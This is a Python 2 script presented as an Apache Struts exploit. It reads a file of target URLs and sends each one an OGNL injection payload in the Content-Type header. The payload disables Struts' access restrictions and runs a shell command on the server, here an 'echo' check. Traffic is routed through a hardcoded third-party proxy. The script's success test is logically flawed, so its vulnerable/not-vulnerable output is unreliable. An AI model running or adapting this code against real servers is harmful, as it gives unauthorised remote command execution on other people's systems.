#!/usr/bin/python
# Exploit Apache2 Struts
# Coded By Afrizal F.A

import re, sys, requests

f = open(sys.argv[1], "r").read()
pisah = f.split("\n")

payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo checkvuln').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

for cok in pisah :
	if not cok :
		continue

	r = requests.get(url=cok, headers={ "Content-Type" : payload , "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" }, proxies={ "http" : "165.227.37.166:8080" }, allow_redirects=True)
	res = r.content
	if not res.find("checkvuln") :
		print "[+] Is Vulnerable : " + cok
        	takok = raw_input("Next Or 'exit' ? ")
        	if takok == "exit" :
            		exit()

	else :
		print "[-] Not Vulnerable : " + cok
